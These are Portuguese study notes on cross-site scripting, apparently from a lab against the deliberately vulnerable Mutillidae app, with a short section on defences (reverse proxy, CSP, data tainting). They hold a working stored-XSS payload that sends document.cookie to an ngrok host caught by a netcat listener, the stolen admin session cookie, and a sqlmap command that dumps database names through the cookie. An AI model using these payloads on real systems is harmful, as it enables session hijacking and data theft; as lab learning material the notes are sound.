	--------------------------------------------   Cross-site Scripting XSS  
	
	Por que existem tantas vulnerabilidades de injeção? 
		Quando falamos de aplicações web falamos do server side e o client side e existe tecnicas de exploração de falhas em ambos. 


	Por que acontece XSS? 
         	Acontece por falta de validação de dados na entrada, o navegador acaba permitindo a execussão do código malicioso.
  
	2 TIPOS DE XSS: 
	
	1 REFLECTED: 
	2 PERSISTENT:

sites que podem ser usados para fazer o bypass do XSS: 
	-- > https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
	-- > https://products.aspose.app/html/pt/url-encoding
	-- > https://meyerweb.com/eric/tools/dencoder/

   - >  PERSISTENT
    Acontece em formulários ( onde acontece a comunicação da API com o cliente-servidor ) a inserção do código malicioso fará uma requisição ao banco de dados ( servidor ) que trará resultado ( persiste ). Ou seja o código malicioso injetado no servidor.

   - > Consequências:
	- a consequência mais crítica do XSS é o roubo de cookies para logar na sessão de login do usuário.

Na prática: 
	Site usado para o ataque: http://mutillidae.bancocn.com/index.php?page=view-someones-blog.php
	
	Verificando se no formulário existe vulnerabilidade XSS:
	<script>alert("sasuke")</script>

	Roubando cookies usando Ngrok e Netcat 
	
	- > Ngrok 		
	
	./ngrok htpp 80  
	 Forwarding: https://3082-143-202-46-22.sa.ngrok.io -> http://localhost:80
	 IP externo - > https://3082-143-202-46-22.sa.ngrok.io
	
	- > Netcat 	
		nc -lvp 80 
	injeção do script no post(formulário) 
		<script> new Image().src="https://3082-143-202-46-22.sa.ngrok.io/?cookie="+document.cookie</script>
	
	
	Netcat -lvp 80 
	Connection received on localhost 45500
	GET /?cookie=PHPSESSID=0ot6tnhbrjolnoqkjmh75kra85;%20googtrans=/en/pt;%20showhints=0;%20username=admin;%20uid=1 HTTP/1.1
	Host: 3082-143-202-46-22.sa.ngrok.io
	User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36
	X-Forwarded-For: 143.202.46.22
	X-Forwarded-Proto: https

	
	Cookie interceptado:
		cookie=PHPSESSID=0ot6tnhbrjolnoqkjmh75kra85;%20googtrans=/en/pt;%20showhints=0;%20username=admin;%20uid=1 HTTP/1.1
	
	
	Dica: Podemos verificar a injeção sqlinjection nos cookies usando sqlmap ou usar o burpsuit. 
	
	identificando vuln nos cookies: 
	
	PHPSESSID=0ot6tnhbrjolnoqkjmh75kra85;%20googtrans=/en/pt;%20showhints=0;%20username=admin;%20uid=1
	PHPSESSID=0ot6tnhbrjolnoqkjmh75kra85;%20googtrans=/en/pt;%20showhints=0;%20username=admin;%20uid=1'
	
	
	http://mutillidae.bancocn.com/index.php?page=login.php
	
	nano header.txt
	POST /index.php?page=login.php HTTP/1.1
	Host: mutillidae.bancocn.com
	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
	Cookie:	PHPSESSID=0ot6tnhbrjolnoqkjmh75kra85;%20googtrans=/en/pt;%20showhints=0;%20username=admin;%20uid=1 HTTP/1.1
	username=admin&password=admin&login-php-submit-button=Login
	
	sqlmap -r header.txt -p Cookie --dbs --dbms=mysql --skip-waf --flush-session --no-cast -v

	return 
	[*] information_schema
	[*] mutillidae
	[*] mysql
	[*] performance_schema
	[*] sys


COMO SE PROTEGER DO XSS ? 

- > Proxy reverso

	- Analisar todas as requisições feitas pelos dispositivos. Seria feita uma interceptação da requisição antes de serem enviadas. 

	 
	        	cliente -------------- > proxy ------------- > internet -------------------- > servidor  


	- As requisições do cliente serão interceptadas pelo proxy que irá aplicar um conjunto de técnicas e depois passá-las a internet.
			 


- > Content Security Policy (CSP) 
 
- Diz respeito a quais parametros são permitidos ou não a serem processados em uma requisição. O desenvolvedor do site pode restrinjir os parâmetros que serão utilizados em uma possivel injeção. 

	
- > Dynamic Data Tainting 
	
		cliente --------------- > internet ---------------- > servidor
		cliente < --------------- internet < ---------------- servidor 
	
	- > Durante a renderização da página no navegador do cliente, acontecerá o monitoramento de código JavaScript,
	possibilitanto uma resposta de execução ou não da página em caso de atividade suspeita. 











